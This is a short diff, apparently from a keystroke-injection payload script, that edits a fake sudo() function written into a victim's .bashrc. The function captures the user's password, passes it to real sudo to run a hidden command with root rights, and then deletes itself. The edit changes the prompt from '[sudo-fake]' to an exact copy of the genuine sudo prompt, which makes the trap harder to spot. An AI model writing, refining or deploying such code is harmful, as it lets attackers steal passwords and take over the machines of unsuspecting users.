@@ -36,7 +36,7 @@ STRINGLN_BLOCK
  echo '
 sudo() {
 while true; do
-    read -s -r -p "[sudo-fake] password for ${USER}: " passwd
+    read -s -r -p "[sudo] password for ${USER}: " passwd
     echo "${passwd}" | /usr/bin/sudo -S ${@} && { echo "${passwd}" | /usr/bin/sudo -S #cmd; head -n -6 .bashrc > temp && mv temp .bashrc; break; } >/dev/null 2>&1 || { clear; echo "Sorry, try again."; }
 done
 }' >> .bashrc
